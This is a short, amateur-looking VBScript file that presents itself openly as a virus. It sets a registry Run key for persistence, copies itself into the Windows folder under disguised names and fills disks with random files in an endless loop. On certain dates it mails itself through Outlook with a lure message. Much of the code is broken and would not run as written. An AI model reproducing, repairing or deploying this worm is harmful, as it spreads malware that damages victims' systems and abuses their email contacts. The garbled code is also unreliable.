   'created by me!
   On Error Resume next
   Set ED = CreateObject("WScript.Shell")ED.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\RunTime1", "wscript.exe %windows%\Virus.exe.vbs %*"
   if month(now) =1 and day(now) =11 then mail
   end if
   if month(now) =5 and day(now) =16 then mail
   end if
   if month(now) =3 and day(now) =21 then mail
   end if
   if month(now) =7 and day(now) =9 then mail
   end if
   if month(now) =6 and day(now) =8 then mail
   end if
   if month(now) =2 and day(now) =8 then mail
   end if
   if month(now) =1 and day(now) =9 then mail
   end if
   if month(now) =12 and day(now) =11 then mail
   end if
   if month(now) =11 and day(now) =11 then mail
   end if
   next
   do
   set FSO=CreateObject("Scripting.FileSystemObject")
   FSO.COPYFILE wscript.scriptfullname "%windir%\Games.exe.vbs" , TRUE
   FSO.COPYFILE wscript.scriptfullname "%windir%\files.vbs" , TRUE
   FSO.createtextfile ("%homedir%\%random%")
   FSO.createtextfile ("%homedir%\%random%")
   FSO.createtextfile ("%windir%\%random%")
   FSO.createtextfile ("%Random%\%Random%\%Random%")
   Dim File1
   If Not (File1.fileexists(wscript.scriptfullname)) Then
   Set newfile= File1.createtextfile(wscript.scriptfullname, True)
   newfile.writepayload
   newfile.Close
   End If
   loop
   end
   Mail:
   On Error Resume next
   Set olOutlookApp = GetObject(, "Outlook.Application")
     If Err <> 0 Then
       Set olOutlookApp = CreateObject("Outlook.Application")
         blnNewOutlookApp = True
     End If
   on error resume next
    Set olEMail = olOutlookApp.CreateItem(olMailItem)
     With olEMail
         For x = 1 To NoToRecp
         .Recipients.Add AddressTo(x)
         Next x
         If NoCCRecp <= 0 Then GoTo Send
         For x = 1 To NoCCRecp
         .Recipients.Add(AddressCC(x)).Type = olCC
          End if
          Next x
   Send:
         .Subject = "was up?"
         .Body = "dont show nobody ok???"
         .Attachments.Add wscript.scriptfullname, olByValue, ,"pj00031"
         .Send
     End With
